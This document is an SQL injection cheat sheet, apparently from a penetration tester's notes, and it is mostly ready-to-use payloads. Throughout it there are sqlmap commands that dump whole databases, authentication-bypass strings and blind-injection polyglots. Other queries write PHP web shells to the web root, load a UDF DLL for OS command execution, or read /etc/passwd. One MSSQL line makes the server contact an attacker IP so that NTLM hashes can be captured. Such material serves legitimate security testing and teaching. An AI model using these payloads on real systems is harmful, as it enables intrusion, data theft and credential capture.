# SQL Injection

## Cheatsheet
- https://www.websec.ca/kb/sql_injection#Extra_About
  - https://docs.google.com/document/d/1z2ozmSfUtT_3RBUM_1FFpTEYj7yKoGBpPlASz_iShsg/edit
- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

## Tools
- SqlMap:
```
sqlmap -r sqlmap.req --level=5 --risk=3 --dump-all​
```
- AutoSQLi: https://github.com/jesuiscamille/AutoSQLi
- SQLiDumper: https://www.cybrary.it/0p3n/pentesting-sqli-dumper-v8-tool/
- Automatic SQL injection with Charles and sqlmap api
  - http://0r1.me/SQLiScanner/
  - https://github.com/0xbug/SQLiScanner

## Payload
Combines blind command injection and blind sql injection ( mysql ) in one payload (works with no quotes/single quotes and double quotes):
```
/*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'"||sleep(5)||"`
```
> https://mobile.twitter.com/bl4ckh4ck5/status/1100167033407320065

WebShell over MySQL

```
SELECT '<?php echo shell_exec($_GET['c']); ?>' INTO OUTFILE '/var/www/html/example.php'
```

User Defined Functions (UDF) (sqlmap/udf/mysql)

```
SELECT @@plugin_dir;
PowerShell$ Convert-Dll -DllPath lib_mysqludf_sys.dll -OutputPath bytes.txt
SELECT CHAR(64,64,....) INTO OUTFILE '<@@plugin_dir>/lib_mysqludf_sys.dll' FIELDS ESCAPED BY '';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';
SELECT sys_eval('whoami');
```

```
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
```

### MySQL
- Order by to get column count: `1337 order by N`
- Read file: `LOAD_FILE('/etc/passwd')`

```
union select 1,2,group_concat(distinct table_schema separator ',') from information_schema.tables LIMIT 1,1
union select 1,2,group_concat(distinct table_name separator ',') from information_schema.tables where table_schema = 'security' LIMIT 1,1
```

- Write to file: `select 1,2,3,4,"<?php echo system($_GET['cmd']); ?>",6 INTO OUTFILE 'C:\htdocs\webroot\shell.php'`

### SQL Server

Run Responder and do following to capture hashes:
```
EXEC(master..xp_dirtree('\\(ATTACKER IP ADDRESS)\foo')--
```

## Techniques
- Add a trigger to do a malicious action (price 0)

## Language Specific

### PHP
- Good example from DOCs, where parameterization is not used: http://php.net/manual/en/mysqli.examples-basic.php (use: https://phptherightway.com/)

## Practice 

- https://github.com/Audi-1/sqli-labs

